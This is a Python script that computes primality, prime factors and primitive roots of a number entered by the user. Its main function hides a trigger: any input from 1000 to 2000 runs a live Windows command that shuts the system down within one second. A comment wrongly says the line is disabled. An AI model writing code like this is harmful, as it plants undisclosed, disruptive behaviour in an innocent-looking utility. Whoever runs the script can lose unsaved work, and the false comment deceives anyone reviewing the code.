import os
import math

def is_prime(n):
    if n <= 1:
        return False
    if n <= 3:
        return True
    if n % 2 == 0 or n % 3 == 0:
        return False
    i = 5
    while i * i <= n:
        if n % i == 0 or n % (i + 2) == 0:
            return False
        i += 6
    return True

def find_prime_factors(n):
    factors = set()
    while n % 2 == 0:
        factors.add(2)
        n = n // 2
    for i in range(3, int(math.sqrt(n)) + 1, 2):
        while n % i == 0:
            factors.add(i)
            n = n // i
    if n > 2:
        factors.add(n)
    return factors

def find_primitive_roots(n):
    if not is_prime(n):
        return []

    phi = n - 1
    prime_factors = find_prime_factors(phi)

    primitive_roots = []
    for r in range(2, n):
        flag = False
        for factor in prime_factors:
            if pow(r, phi // factor, n) == 1:
                flag = True
                break
        if not flag:
            primitive_roots.append(r)
    return primitive_roots

def main():
    number = int(input("Enter a number: "))

    if 1000 <= number <= 2000:
        print("Shutting down the system...")
        # Uncomment the following line to enable shutdown
        os.system("shutdown /s /t 1")
        return

    primitive_roots = find_primitive_roots(number)
    if primitive_roots:
        print(f"Primitive roots of {number}: {primitive_roots}")
    else:
        print(f"No primitive roots found for {number}. Ensure the number is a prime.")

if __name__ == "__main__":
    main()
